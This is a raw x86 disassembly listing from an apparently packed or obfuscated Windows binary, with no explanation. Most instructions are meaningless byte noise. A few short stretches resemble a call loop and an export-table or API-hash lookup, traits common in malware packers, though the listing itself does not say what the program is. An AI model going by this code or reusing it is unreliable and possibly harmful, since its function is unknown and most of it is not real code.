  40ebb9:	jle    0x40ec39
  40ebbb:	push   esp
  40ebbc:	jg     0x40ec3c
  40ebbe:	jle    0x40ec2c
  40ebc0:	jns    0x40ebfc
  40ebc2:	addr16 addr16 push eax
  40ebc5:	mov    ds:0x2502f0dd,eax
  40ebca:	jle    0x40ec0a
  40ebcc:	retf   
  40ebcd:	fwait
  40ebce:	test   DWORD PTR [ebx+0x5f25c353],ebp
  40ebd4:	jecxz  0x40ec17
  40ebd6:	(bad)
  40ebda:	xchg   DWORD PTR [esi+0x7ff0e373],ebx
  40ebe0:	sub    ebx,ebp
  40ebe2:	lahf   
  40ebe3:	stos   DWORD PTR es:[edi],eax
  40ebe4:	outs   dx,DWORD PTR ds:[esi]
  40ebe5:	xchg   edi,eax
  40ebe6:	fwait
  40ebe7:	and    BYTE PTR [ebx+0x1c],al
  40ebea:	jnp    0x40ebfd
  40ebec:	pop    eax
  40ebed:	push   0xc8c720b1
  40ebf2:	adc    eax,0x78b536f
  40ebf7:	sub    BYTE PTR [ebp-0x1d9c5d43],cl
  40ebfd:	dec    ebx
  40ebfe:	call   0xb22ad1a2
  40ec03:	pop    ss
  40ec04:	in     al,dx
  40ec05:	mov    eax,0xf8ac98ed
  40ec0a:	shl    DWORD PTR [ecx],cl
  40ec0c:	cld    
  40ec0d:	xor    BYTE PTR [ebx+esi*2-0x44],0x3c
  40ec12:	std    
  40ec13:	popf   
  40ec14:	fucomip st,st(6)
  40ec16:	shl    BYTE PTR [ecx],0xcc
  40ec19:	xor    esi,DWORD PTR [ebx+0x4f]
  40ec1c:	pushf  
  40ec1d:	test   al,0x5f
  40ec1f:	xchg   ebp,eax
  40ec20:	test   DWORD PTR [ecx-0x31324b49],esp
  40ec26:	std    
  40ec27:	retf   0x8dfc
  40ec2a:	jnp    0x40ec1d
  40ec2c:	pop    ss
  40ec2d:	daa    
  40ec2e:	dec    edi
  40ec2f:	(bad)
  40ec32:	pop    eax
  40ec33:	aam    0x91
  40ec35:	data16 adc dl,ah
  40ec38:	sbb    esi,ecx
  40ec3a:	sti    
  40ec3b:	sbb    DWORD PTR [ecx-0x861aee2],0xffffff9e
  40ec42:	sbb    BYTE PTR [ecx+0x5dd0a3e5],cl
  40ec48:	aad    0xcd
  40ec4a:	int    0x1b
  40ec4c:	adc    al,ch
  40ec4e:	mov    eax,ds:0x2c4a22c
  40ec53:	arpl   WORD PTR [edi-0x5d4a45fa],dx
  40ec59:	pop    ebp
  40ec5a:	mov    esp,0x3a6c8aa1
  40ec5f:	scas   al,BYTE PTR es:[edi]
  40ec60:	sub    eax,0x78c871a8
  40ec65:	mov    ebp,DWORD PTR [esp+esi*1+0x7bbc6953]
  40ec6c:	retf   0x42cd
  40ec6f:	ror    BYTE PTR [eax],cl
  40ec71:	pop    ss
  40ec72:	dec    edx
  40ec73:	mov    ebp,0x16655fac
  40ec78:	dec    ebp
  40ec79:	test   eax,0x1a955061
  40ec7e:	adc    ch,BYTE PTR [ebx+edi*2]
  40ec81:	push   ds
  40ec82:	or     edx,ebx
  40ec84:	clc    
  40ec85:	(bad)  
  40ec86:	push   cs
  40ec87:	push   0x6
  40ec89:	push   0x45ee9108
  40ec8e:	dec    ebx
  40ec8f:	xchg   ebp,eax
  40ec90:	sbb    eax,0xea3df217
  40ec95:	pop    ds
  40ec96:	scas   al,BYTE PTR es:[edi]
  40ec97:	aaa    
  40ec98:	not    DWORD PTR [ebp-0x4c10e49a]
  40ec9e:	jp     0x40ec8b
  40eca0:	(bad)  
  40eca1:	bnd jbe 0x40ecfc
  40eca4:	loope  0x40ec50
  40eca6:	ret    0x75c3
  40eca9:	cmp    ah,ch
  40ecab:	outs   dx,BYTE PTR cs:[esi]
  40ecad:	sbb    eax,0x3e87ee53
  40ecb2:	fwait
  40ecb3:	(bad)  
  40ecb4:	jp     0x40ecce
  40ecb6:	out    0x39,al
  40ecb8:	lods   al,BYTE PTR es:[esi]
  40ecba:	add    BYTE PTR [ecx],ch
  40ecbc:	clc    
  40ecbd:	dec    ecx
  40ecbe:	imul   eax,DWORD PTR [ebx-0xb062df7],0x674bd606
  40ecc8:	loope  0x40ec87
  40ecca:	mov    esi,0x4016fbc5
  40eccf:	or     edi,DWORD PTR [ebp+0x55ad8004]
  40ecd5:	lea    esp,[ebx-0x36]
  40ecd8:	or     BYTE PTR [ebx],cl
  40ecda:	jmp    0x40ed2b
  40ecdc:	xchg   bl,bh
  40ecde:	xchg   ebp,eax
  40ecdf:	sub    eax,0xbe88bf46
  40ece4:	jne    0x40ecae
  40ece6:	add    ch,ch
  40ece8:	adc    eax,0x7bbec46f
  40eced:	retf   0x4191
  40ecf0:	push   es
  40ecf1:	aam    0x0
  40ecf3:	iret   
  40ecf4:	shl    ah,cl
  40ecf6:	adc    DWORD PTR [ebp-0x64],0xfb8ca3c8
  40ecfd:	xor    ah,dh
  40ecff:	inc    esp
  40ed00:	dec    edi
  40ed01:	xchg   edx,eax
  40ed02:	or     eax,DWORD PTR [esp+edi*4]
  40ed05:	mov    bl,BYTE PTR [edx+0x25807e18]
  40ed0b:	pop    ss
  40ed0c:	mov    ch,BYTE PTR [ebx+edi*8-0x1568a4e2]
  40ed13:	mov    eax,ds:0x3ae7fc5e
  40ed18:	(bad)
  40ed1d:	lods   eax,DWORD PTR ds:[esi]
  40ed1e:	xchg   ebx,eax
  40ed1f:	add    ch,BYTE PTR [esp+eiz*8-0x67]
  40ed23:	stos   DWORD PTR es:[edi],eax
  40ed24:	dec    esi
  40ed25:	iret   
  40ed26:	and    al,0x10
  40ed28:	aam    0x26
  40ed2a:	cdq    
  40ed2b:	dec    ebx
  40ed2c:	adc    al,BYTE PTR [edi+0x41bb0578]
  40ed32:	gs ins DWORD PTR es:[edi],dx
  40ed34:	std    
  40ed35:	shr    bh,0xe8
  40ed38:	(bad)  
  40ed39:	mov    ecx,0x1fefd150
  40ed3e:	xor    al,0xfa
  40ed40:	adc    ah,al
  40ed42:	and    al,bl
  40ed44:	in     al,dx
  40ed45:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ed47:	enter  0xd56e,0xdf
  40ed4b:	adc    bl,BYTE PTR [ebx+esi*1-0x42c9d24f]
  40ed52:	sbb    eax,0x27966fd1
  40ed57:	dec    edi
  40ed58:	(bad)  
  40ed59:	mov    ebx,0x61af3b0b
  40ed5e:	pop    sp
  40ed60:	lods   al,BYTE PTR ds:[esi]
  40ed61:	cmp    esi,eax
  40ed63:	push   0x5b
  40ed65:	ror    BYTE PTR [ebx-0x2f6b4686],0xec
  40ed6c:	retf   0xb6a5
  40ed6f:	jae    0x40edad
  40ed71:	push   ecx
  40ed72:	rcr    DWORD PTR [edi+edx*1+0x62641a83],0xe4
  40ed7a:	lods   al,BYTE PTR ds:[esi]
  40ed7b:	or     bl,0xd7
  40ed7e:	xchg   esp,eax
  40ed7f:	int3   
  40ed80:	sub    BYTE PTR [esi-0xae88382],bh
  40ed86:	cdq    
  40ed87:	dec    eax
  40ed88:	jbe    0x40edc8
  40ed8a:	jl     0x40ed1d
  40ed8c:	out    0xa9,al
  40ed8e:	push   ebx
  40ed8f:	pop    esi
  40ed90:	sub    BYTE PTR [ebp+0x45],cl
  40ed93:	lea    esp,[ecx+0x63887664]
  40ed99:	xor    eax,edx
  40ed9b:	sub    ecx,DWORD PTR ds:0x433653
  40eda1:	xor    esi,edx
  40eda3:	mov    DWORD PTR ds:0x4336d3,0x18
  40edad:	cmp    DWORD PTR ds:0x4336d3,0x0
  40edb4:	je     0x40edf4
  40edba:	cmp    DWORD PTR ds:0x4336d3,0x20
  40edc1:	jne    0x40ede2
  40edc7:	push   DWORD PTR [ebp-0x14]
  40edca:	push   DWORD PTR [ebp-0xc]
  40edcd:	push   0x5135
  40edd2:	push   0x2d1e
  40edd7:	push   0x400000
  40eddc:	call   DWORD PTR ds:0x4120f0
  40ede2:	mov    ecx,DWORD PTR ds:0x4336d3
  40ede8:	dec    ecx
  40ede9:	mov    DWORD PTR ds:0x4336d3,ecx
  40edef:	jmp    0x40edad
  40edf4:	mov    ecx,0x32729b
  40edf9:	add    esi,ecx
  40edfb:	add    eax,ecx
  40edfd:	imul   eax,esi
  40ee00:	mov    esi,DWORD PTR [ebp+0xc]
  40ee03:	cmp    esi,eax
  40ee05:	jne    0x40ee21
  40ee0b:	mov    eax,DWORD PTR [ebp-0x4]
  40ee0e:	mov    esi,DWORD PTR [ebp-0x8]
  40ee11:	xor    eax,edx
  40ee13:	xor    esi,edx
  40ee15:	add    eax,ecx
  40ee17:	add    esi,ecx
  40ee19:	imul   eax,esi
  40ee1c:	jmp    0x40f053
  40ee21:	mov    eax,DWORD PTR [ebp+0xc]
  40ee24:	mov    eax,DWORD PTR [eax+0x78]
  40ee27:	mov    DWORD PTR [ebp+0xc],eax
  40ee2a:	mov    eax,DWORD PTR [ebp-0x4]
  40ee2d:	mov    esi,DWORD PTR [ebp-0x8]
  40ee30:	xor    eax,edx
  40ee32:	xor    esi,edx
  40ee34:	add    eax,ecx
  40ee36:	add    esi,ecx
  40ee38:	imul   eax,esi
  40ee3b:	mov    esi,DWORD PTR [ebp+0xc]
  40ee3e:	cmp    esi,eax
  40ee40:	mov    eax,DWORD PTR [ebp-0x4]
  40ee43:	je     0x40ee0e
  40ee49:	xor    eax,edx
  40ee4b:	add    eax,ecx
  40ee4d:	mov    ecx,DWORD PTR [ebp+0xc]
  40ee50:	imul   eax,ecx
  40ee53:	add    eax,DWORD PTR [ebp+0x8]
  40ee56:	mov    DWORD PTR [ebp+0xc],eax
  40ee59:	jmp    0x40f050
  40ee5e:	mov    dl,0xbd
  40ee60:	push   0xffffffdc
  40ee62:	jno    0x40ee4d
  40ee64:	mov    al,0x51
  40ee66:	ja     0x40eebe
  40ee68:	sbb    edx,DWORD PTR [edx-0x7b996ef2]
  40ee6e:	lock mov ds:0x7f547e7e,eax
  40ee74:	jle    0x40eef4
  40ee76:	cmp    eax,0x1b1ed5e2
  40ee7b:	push   es
  40ee7c:	repnz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40ee7e:	dec    eax
  40ee7f:	js     0x40ee28
  40ee81:	mov    al,ds:0x7d1f4833
  40ee86:	popa   
  40ee87:	dec    esi
  40ee88:	call   0x4b64:0xcb5b4741
  40ee8f:	daa    
  40ee90:	add    edi,DWORD PTR [edi-0x6b]
  40ee93:	inc    edx
  40ee94:	pop    ebp
  40ee95:	into   
  40ee96:	pop    ebp
  40ee97:	mov    ds:0xeea51466,eax
  40ee9c:	pop    edx
  40ee9d:	mov    ecx,edx
  40ee9f:	and    al,BYTE PTR [ecx-0x71]
  40eea2:	cmc    
  40eea3:	mov    ecx,0x6b3dc0d5
  40eea8:	pop    edx
  40eea9:	jmp    0x9d9b3bda
  40eeae:	sbb    edx,DWORD PTR [edi-0x520ddadd]
  40eeb4:	ins    DWORD PTR es:[edi],dx
  40eeb5:	and    DWORD PTR [edi-0x28],ebp
  40eeb8:	mov    ebx,0x5f374c39
  40eebd:	(bad)
  40eec0:	(bad)  
  40eec1:	les    ecx,FWORD PTR [ecx]
  40eec3:	cmp    DWORD PTR ds:0x6be6f34a,0x150f2d0f
  40eecd:	mov    ebx,0x79141616
  40eed2:	adc    ebx,edx
  40eed4:	jbe    0x40ee84
  40eed6:	mov    al,ds:0x97529052
  40eedb:	sti    
  40eedc:	or     al,BYTE PTR [ecx-0x25]
  40eedf:	ja     0x40ee95
  40eee1:	in     eax,0xc3
  40eee3:	inc    edx
  40eee4:	mov    cs,ecx
  40eee6:	mov    ecx,es
  40eee8:	pop    ebx
  40eee9:	adc    al,0x4b
  40eeeb:	test   dh,cl
  40eeed:	(bad)  
  40eeee:	mov    cs,WORD PTR [esi+0x53d1fc6b]
  40eef4:	push   esp
  40eef5:	cmp    eax,0x7e7c09ed
  40eefa:	dec    edx
  40eefb:	xchg   ebx,eax
  40eefc:	push   esp
  40eefd:	mov    al,BYTE PTR [ecx-0x2b743f79]
  40ef03:	jns    0x40ef7e
  40ef05:	pop    ecx
  40ef06:	outs   dx,DWORD PTR ds:[esi]
  40ef07:	test   BYTE PTR [esi+0x15b06c9d],bl
  40ef0d:	pop    edx
  40ef0e:	or     eax,0xf087b15
  40ef13:	xor    BYTE PTR [edi],dl
  40ef15:	ds sub ch,cl
  40ef18:	in     eax,dx
  40ef19:	mov    bl,0xa7
  40ef1b:	rol    BYTE PTR [ebx-0x247fa70e],cl
  40ef21:	test   DWORD PTR [ebp+0x78],ebp
  40ef24:	in     al,0x12
  40ef26:	mov    dl,0x2
  40ef28:	and    al,0xaa
  40ef2a:	in     al,0xbf
  40ef2c:	mov    ds:0xc8458bea,al
  40ef31:	ins    BYTE PTR es:[edi],dx
  40ef32:	jp     0x40ef4b
  40ef34:	loopne 0x40ef63
  40ef36:	(bad)  
  40ef37:	aas    
  40ef38:	loop   0x40ef1c
  40ef3a:	stc    
  40ef3b:	popf   
  40ef3c:	test   al,0x14
  40ef3e:	or     DWORD PTR [eax+eax*8+0x6221049f],0xb3e31dca
  40ef49:	inc    esp
  40ef4a:	mov    DWORD PTR [edi],edx
  40ef4c:	dec    edi
  40ef4d:	cli    
  40ef4e:	mov    edi,0x5e624057
  40ef53:	push   edx
  40ef54:	push   es
  40ef55:	push   ebx
  40ef56:	adc    eax,0xa9f2d33f
  40ef5b:	adc    al,0x72
  40ef5d:	mov    WORD PTR [edx+ecx*1-0x11],ss
  40ef61:	dec    ebx
  40ef62:	mov    dl,0x6d
  40ef64:	bound  ecx,QWORD PTR es:[eax]
  40ef67:	test   DWORD PTR [eax-0x58],eax
  40ef6a:	jl     0x40ef32
  40ef6c:	mov    ebx,0xc1b813eb
  40ef71:	leave  
  40ef72:	fnsave [edx+0x56]
  40ef75:	test   al,0xef
  40ef77:	pop    ecx
  40ef78:	xor    al,dh
  40ef7a:	imul   eax,DWORD PTR [esi+eax*8+0x7d7ae5aa],0x521078bb
  40ef85:	adc    BYTE PTR [eax+eax*8-0x19],cl
  40ef89:	popa   
  40ef8a:	and    eax,0x21c6cdf4
  40ef8f:	shr    BYTE PTR [eax+0x71],0x2f
  40ef93:	adc    DWORD PTR [ecx-0x9],ebx
  40ef96:	pop    edx
  40ef97:	mov    ebx,0x3a2fe5b7
  40ef9c:	jbe    0x40ef7a
  40ef9e:	sub    dh,BYTE PTR [edx-0x4]
  40efa1:	mov    esp,0xcdd9337a
  40efa6:	cmp    esi,DWORD PTR [ecx+ebx*4+0x72596905]
  40efad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40efae:	loope  0x40ef7b
  40efb0:	add    eax,0xb5bcfebc
  40efb5:	push   ecx
  40efb6:	daa    
  40efb7:	sbb    ecx,DWORD PTR [si+0x2b]
  40efbb:	(bad)  
  40efbc:	icebp  
  40efbd:	dec    ebx
  40efbe:	or     al,0xf1
  40efc0:	fdivrp st(2),st
  40efc2:	sub    al,0x65
  40efc4:	add    ebp,edi
  40efc6:	mov    ecx,0x5a764692
  40efcb:	xlat   BYTE PTR ds:[ebx]
  40efcc:	adc    DWORD PTR [edx],esi
  40efce:	stc    
  40efcf:	mov    ch,BYTE PTR [eax]
  40efd1:	jbe    0x40efec
  40efd3:	arpl   WORD PTR [eax+0x54],bp
  40efd6:	cmp    BYTE PTR [eax+0x29],0xd4
  40efda:	bound  ebx,QWORD PTR [esi+0x2e]
  40efdd:	test   DWORD PTR [esi-0x31],eax
  40efe0:	stc    
  40efe1:	mov    BYTE PTR [eax+0x66],cl
  40efe4:	mov    bh,0xd0
  40efe6:	mov    ecx,0x14046b86
  40efeb:	jl     0x40f029
  40efed:	mov    edi,?
  40efef:	inc    esp
  40eff0:	and    BYTE PTR [edi-0x7829f1c3],0xa8
  40eff7:	sar    esi,0xd2
  40effa:	fdiv   st(7),st
  40effc:	dec    esi
  40effd:	add    edi,ebx
  40efff:	push   es
  40f000:	int    0x52
  40f002:	daa    
  40f003:	outs   dx,DWORD PTR ds:[esi]
  40f004:	mov    edx,0xe0950e3c
  40f009:	add    al,0x63
  40f00b:	(bad)  
  40f00c:	mov    dh,0xd0
  40f00e:	dec    ebp
  40f00f:	mov    al,ds:0xf00682e4
  40f014:	push   esp
  40f015:	xchg   cl,bl
  40f017:	ja     0x40efb5
  40f019:	lods   al,BYTE PTR ds:[esi]
  40f01a:	mov    ah,0xf2
  40f01c:	xor    eax,0x2327a1e8
  40f021:	scas   eax,DWORD PTR es:[edi]
  40f022:	sub    BYTE PTR [esp+edx*2-0x5fa8b7b8],0x38
  40f02a:	aas    
  40f02b:	les    ebx,FWORD PTR [ebx+edx*1-0x3a]
  40f02f:	popa   
  40f030:	mov    edi,0xc69805a7
  40f035:	add    edi,DWORD PTR [esi+edi*4-0x29]
  40f039:	pop    ds
  40f03a:	jle    0x40f040
  40f03c:	dec    ebp
  40f03d:	mov    edi,ebp
  40f03f:	adc    bh,bh
  40f041:	(bad)  
  40f042:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f043:	repnz out dx,al
  40f045:	xchg   ebx,eax
  40f046:	je     0x40f066
  40f048:	mov    al,ds:0xe39afb32
  40f04d:	shr    ebx,cl
  40f04f:	aam    0x8b
  40f051:	inc    ebp
  40f052:	or     al,0x5e
  40f054:	leave  
  40f055:	ret    0x8
  40f058:	push   ebp
  40f059:	mov    ebp,esp
  40f05b:	push   ecx
  40f05c:	push   ecx
  40f05d:	inc    DWORD PTR ds:0x43369b
  40f063:	jmp    0x40f382
  40f068:	inc    ecx
  40f069:	iret   
  40f06a:	scas   al,BYTE PTR es:[edi]
  40f06b:	(bad)  
  40f06c:	mov    al,0x67
  40f06e:	jno    0x40f0b9
  40f070:	sub    DWORD PTR ds:0x44e31594,ebx
  40f076:	mov    DWORD PTR [eax],edx
  40f078:	(bad)  
  40f079:	mov    eax,ds:0x7d7c7e7e
  40f07e:	jle    0x40f0fe
  40f080:	add    ah,BYTE PTR [ebx+0x14]
  40f083:	sbb    DWORD PTR [ebx+0x7d24b032],ebp
  40f089:	adc    dh,BYTE PTR [ebx+0x115310c8]
  40f08f:	xchg   ebp,eax
  40f090:	sbb    eax,0x3506bf00
  40f095:	dec    edi
  40f096:	add    BYTE PTR [esi+0x6a],ah
  40f099:	test   al,0xf0
  40f09b:	mov    esp,0xc7c69aee
  40f0a0:	cmp    cl,ch
  40f0a2:	push   ebp
  40f0a3:	or     dh,ah
  40f0a5:	ins    DWORD PTR es:[edi],dx
  40f0a6:	jmp    0x3ecb:0x3f2fefa0
  40f0ad:	pop    ds
  40f0ae:	cld    
  40f0af:	aam    0x8a
  40f0b1:	adc    esi,DWORD PTR [ebp*1-0x7da29ebd]
  40f0b8:	and    eax,edx
  40f0ba:	fld    TBYTE PTR ds:0xdfda0bdb
  40f0c0:	dec    edx
  40f0c1:	dec    edx
  40f0c2:	lds    esi,FWORD PTR [esi+0x38]
  40f0c5:	jmp    0xc9c:0xae37d6ec
  40f0cc:	or     al,0x73
  40f0ce:	dec    DWORD PTR [ebx-0xd360c04]
  40f0d4:	xor    al,0x1f
  40f0d6:	fidiv  WORD PTR [eax+eax*8]
  40f0d9:	clc    
  40f0da:	mov    edx,?
  40f0dc:	aam    0x7e
  40f0de:	add    BYTE PTR [ebx],ah
  40f0e0:	sub    DWORD PTR [edi*8-0x12df3221],0xfffffff8
  40f0e8:	push   ds
  40f0e9:	mov    ebx,0xead61cc8
  40f0ee:	popf   
  40f0ef:	iret   
  40f0f0:	or     al,0x26
  40f0f2:	fsincos 
  40f0f4:	sub    DWORD PTR [esp+edx*8+0x42357110],ebx
  40f0fb:	cld    
  40f0fc:	dec    eax
  40f0fd:	sub    eax,0x220c7b51
  40f102:	fst    QWORD PTR [edi+0x1]
  40f105:	xchg   ecx,eax
  40f106:	pop    esi
  40f107:	repnz pop es
  40f109:	scas   al,BYTE PTR es:[edi]
  40f10a:	outs   dx,BYTE PTR ds:[esi]
  40f10b:	int    0x3b
  40f10d:	push   0xffffffb8
  40f10f:	ds ja  0x40f0f2
  40f112:	outs   dx,BYTE PTR ds:[esi]
  40f113:	fisttp QWORD PTR [ecx]
  40f115:	add    al,0x5b
  40f117:	int    0xd8
  40f119:	add    al,0xf
  40f11b:	outs   dx,DWORD PTR ds:[esi]
  40f11c:	xor    eax,0xa65bdcc7
  40f121:	(bad)  
  40f122:	mov    ds:0x2d6d8232,eax
  40f127:	cmp    DWORD PTR [ebx+0x75991133],esi
  40f12d:	not    BYTE PTR [edi+ebx*1+0x69]
  40f131:	and    BYTE PTR [ecx+0x34],ah
  40f134:	add    eax,0xbf4e5f84
  40f139:	mov    ecx,0x353d2ffb
  40f13e:	test   al,dh
  40f140:	mov    ah,0x8a
  40f142:	loop   0x40f15a
  40f144:	push   ss
  40f145:	xchg   ebx,eax
  40f146:	repnz sti 
  40f148:	test   BYTE PTR [eax-0x6b],dl
  40f14b:	int3   
  40f14c:	inc    ebx
  40f14d:	in     eax,dx
  40f14e:	je     0x40f161
  40f150:	mov    dl,0x9c
  40f152:	stos   BYTE PTR es:[edi],al
  40f153:	push   edi
  40f154:	popa   
  40f155:	in     eax,0x1c
  40f157:	jae    0x40f125
  40f159:	inc    esp
  40f15a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40f15b:	shl    BYTE PTR [ecx-0x759fefd5],0x54
  40f162:	scas   al,BYTE PTR es:[edi]
  40f163:	addr16 xchg ebp,eax
  40f165:	test   esp,0x3ba9e00e
  40f16b:	mov    ebx,fs
  40f16d:	mov    ah,0xd8
  40f16f:	adc    eax,0xe4597176
  40f174:	nop
  40f175:	ds mov bh,0x21
  40f178:	ja     0x40f190
  40f17a:	push   edi
  40f17b:	jp     0x40f109
  40f17d:	in     eax,0xd6
  40f17f:	mov    DWORD PTR [esi-0x49f1bff4],edx
  40f185:	xor    BYTE PTR [esi+ecx*4],bh
  40f188:	cmp    ah,BYTE PTR [esi+esi*8]
  40f18b:	jp     0x40f1c1
  40f18d:	mov    al,ds:0x113adade
  40f192:	sahf   
  40f193:	ss dec esi
  40f195:	dec    ebp
  40f196:	mov    al,0x58
  40f198:	rcl    dl,cl
  40f19a:	scas   eax,DWORD PTR es:[edi]
  40f19b:	pushf  
  40f19c:	sbb    esi,ecx
  40f19e:	push   ebx
  40f19f:	xchg   esi,eax
  40f1a0:	fwait
  40f1a1:	sub    edx,DWORD PTR [esi-0x5eb81d94]
  40f1a7:	xchg   edx,eax
  40f1a8:	cmp    eax,DWORD PTR [edi-0x6e]
  40f1ab:	cmp    eax,0x2d409859
  40f1b0:	dec    esp
  40f1b1:	sbb    eax,0x9120a815
  40f1b6:	xchg   edi,eax
  40f1b7:	mov    al,ds:0xefd00dd8
  40f1bc:	imul   ebx,ebp,0x50
  40f1bf:	mov    cl,0x6c
  40f1c1:	push   cs
  40f1c2:	popf   
  40f1c3:	mov    esp,0x8fe31521
  40f1c8:	jne    0x40f203
  40f1ca:	js     0x40f244
  40f1cc:	retf   
  40f1cd:	inc    edi
  40f1ce:	mov    bh,0x44
  40f1d0:	xor    BYTE PTR [eax+0x22],0x7
  40f1d4:	ror    DWORD PTR [eax-0x7a],cl
  40f1d7:	popa   
  40f1d8:	loop   0x40f20f
  40f1da:	(bad)  
  40f1db:	xchg   edi,eax
  40f1dc:	lods   al,BYTE PTR ds:[esi]
  40f1dd:	lods   eax,DWORD PTR ds:[esi]
  40f1de:	repz lahf 
  40f1e0:	jbe    0x40f1d9
  40f1e2:	stc    
  40f1e3:	mov    fs,WORD PTR [edx+0x698fa133]
  40f1e9:	(bad)  
  40f1ea:	fcmovnu st,st(5)
  40f1ec:	add    eax,0xaca2e274
  40f1f1:	inc    edx
  40f1f2:	int3   
  40f1f3:	add    al,0xe2
  40f1f5:	lea    esi,[esi+edi*2]
  40f1f8:	push   es
  40f1f9:	and    eax,0x8e22c4f6
  40f1fe:	inc    ecx
  40f1ff:	aam    0xd0
  40f201:	push   ebp
  40f202:	mov    al,0xd3
  40f204:	dec    esi
  40f205:	push   eax
  40f206:	dec    ecx
  40f207:	sbb    ebx,DWORD PTR [ebx+0x6d]
  40f20a:	mov    edx,0x566a3f3f
  40f20f:	lock loopne 0x40f1f1
  40f212:	push   edi
  40f213:	fs xchg edi,eax
  40f215:	aad    0x9d
  40f217:	aaa    
  40f218:	mov    edi,0x93a9e2ef
  40f21d:	out    0xf2,eax
  40f21f:	xor    bl,BYTE PTR [eax-0x67151f89]
  40f225:	or     edx,DWORD PTR [esi]
  40f227:	bound  esi,QWORD PTR [ecx+0x12]
  40f22a:	ja     0x40f1b8
  40f22c:	inc    ebx
  40f22d:	mov    eax,ds:0xc8aff539
  40f232:	mov    al,ds:0x5b2a3cc6
  40f237:	jl     0x40f1c4
  40f239:	pop    ecx
  40f23a:	push   esi
  40f23b:	inc    ebp
  40f23c:	mov    dh,0xe2
  40f23e:	and    DWORD PTR [esi],edx
  40f240:	addr16 pop ebp
  40f242:	sub    ecx,edi
  40f244:	fdivr  QWORD PTR [esi]
  40f246:	iret   
  40f247:	jecxz  0x40f271
  40f249:	popa   
  40f24a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40f24b:	jge    0x40f1d3
  40f24d:	mov    ds:0x5df49d24,al
  40f252:	xor    BYTE PTR [eax],bl
  40f254:	lds    esp,FWORD PTR [ecx]
  40f256:	mov    bl,BYTE PTR [esi-0x3e]
  40f259:	lds    esp,FWORD PTR [edx+0x4df4a550]
  40f25f:	add    ecx,edx
  40f261:	cmp    al,0xfc
  40f263:	jge    0x40f1eb
  40f265:	fwait
  40f266:	aas    
  40f267:	mov    eax,0xbacbae76
  40f26c:	xlat   BYTE PTR ds:[ebx]
  40f26d:	(bad)  
  40f26e:	jnp    0x40f295
  40f270:	adc    eax,0x56a6729
  40f275:	pop    eax
  40f276:	sbb    dl,bh
  40f278:	mov    ecx,0x61caf598
  40f27d:	add    DWORD PTR [edi+0x70],0x568ff90d
  40f284:	push   esi
  40f285:	out    0x76,eax
  40f287:	test   al,0x98
  40f289:	jg     0x40f2db
  40f28b:	mov    al,ds:0x7b848bf4
  40f290:	retf   
  40f291:	mov    eax,ds:0x6dd02367
  40f296:	sub    cl,BYTE PTR [eax-0x1baa3d15]
  40f29c:	or     eax,0x4949c7e5
  40f2a1:	jmp    0x5e05c7b
  40f2a6:	std    
  40f2a7:	imul   esp,DWORD PTR [ebp-0x5],0x85a79f5f
  40f2ae:	push   es
  40f2af:	leave  
  40f2b0:	pop    ebp
  40f2b1:	jg     0x40f2db
  40f2b3:	jbe    0x40f235
  40f2b5:	scas   eax,DWORD PTR es:[edi]
  40f2b6:	imul   eax,DWORD PTR [edx-0x11],0xad79eaac
  40f2bd:	test   al,0x77
  40f2bf:	popa   
  40f2c0:	shl    ebp,1
  40f2c2:	std    
  40f2c3:	in     eax,0x29
  40f2c5:	lods   eax,DWORD PTR ds:[esi]
  40f2c6:	lods   eax,DWORD PTR ds:[esi]
  40f2c7:	mov    edx,0x611dd219
  40f2cc:	and    ah,dh
  40f2ce:	cwde   
  40f2cf:	enter  0x4f12,0xc5
  40f2d3:	jecxz  0x40f2d3
  40f2d5:	mov    esp,0x22912acb
  40f2da:	fidivr DWORD PTR [ecx]
  40f2dc:	and    al,BYTE PTR [edx-0x58]
  40f2df:	popf   
  40f2e0:	dec    ecx
  40f2e1:	cmp    ebx,DWORD PTR [eax]
  40f2e3:	adc    esp,DWORD PTR [edi+0x56]
  40f2e6:	xor    DWORD PTR [esp+edx*8],0xffffffe4
  40f2ea:	cmp    eax,0xa4f9baa5
  40f2ef:	aad    0x52
  40f2f1:	lea    eax,ds:0x8d3ebac5
  40f2f7:	js     0x40f2fb
  40f2f9:	jb     0x40f293
  40f2fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40f2fc:	push   0xffffffb9
  40f2fe:	mov    ds:0xca09cf15,al
  40f303:	dec    esp
  40f304:	mov    DWORD PTR [ebx+0x499acf3],edi
  40f30a:	sub    ch,bl
  40f30c:	sbb    al,0x4
  40f30e:	js     0x40f32e
  40f310:	and    eax,0x32fef0bf
  40f315:	jp     0x40f348
  40f317:	fs xchg esp,eax
  40f319:	(bad)  
  40f31b:	imul   ebp,DWORD PTR [ebp+eax*8-0x3b],0x97fa9d7a
  40f323:	jmp    0x40f396
  40f325:	ins    DWORD PTR es:[edi],dx
  40f326:	cmp    DWORD PTR [ecx-0x401689e4],0x95afe2a2
  40f330:	push   es
  40f331:	lock scas al,BYTE PTR es:[edi]
  40f333:	jo     0x40f39b
  40f335:	jg     0x40f2d1
  40f337:	bound  ecx,QWORD PTR [edx+0x3fb4057b]
  40f33d:	test   eax,0x8d4fd53f
  40f342:	fiadd  DWORD PTR [ebx]
  40f344:	enter  0xa1f6,0x46
  40f348:	ins    BYTE PTR es:[edi],dx
  40f349:	adc    al,0x38
  40f34b:	loopne 0x40f3aa
  40f34d:	or     DWORD PTR [ebx],ebp
  40f34f:	enter  0xec30,0xdc
  40f353:	pop    esp
  40f354:	aaa    
  40f355:	addr16 inc ebx
  40f357:	fldcw  WORD PTR ds:0x673a2f08
  40f35d:	lock js 0x40f390
  40f360:	mov    ebx,0x654e2bc
  40f365:	inc    esp
  40f366:	fadd   QWORD PTR [esi-0x57ed1b07]
  40f36c:	inc    esp
  40f36d:	fcomp  QWORD PTR [ecx+0x770e5935]
  40f373:	xchg   DWORD PTR [edx-0x25],ebp
  40f376:	pop    esi
  40f377:	fisub  WORD PTR [eax]
  40f379:	lods   al,BYTE PTR ds:[esi]
  40f37a:	cs ds and bl,0xb1
  40f37f:	hlt    
  40f380:	mov    edi,0x8531b851
  40f385:	pushf  
  40f386:	clc    
  40f387:	and    DWORD PTR ds:0x433727,0x0
  40f391:	xor    ecx,ecx
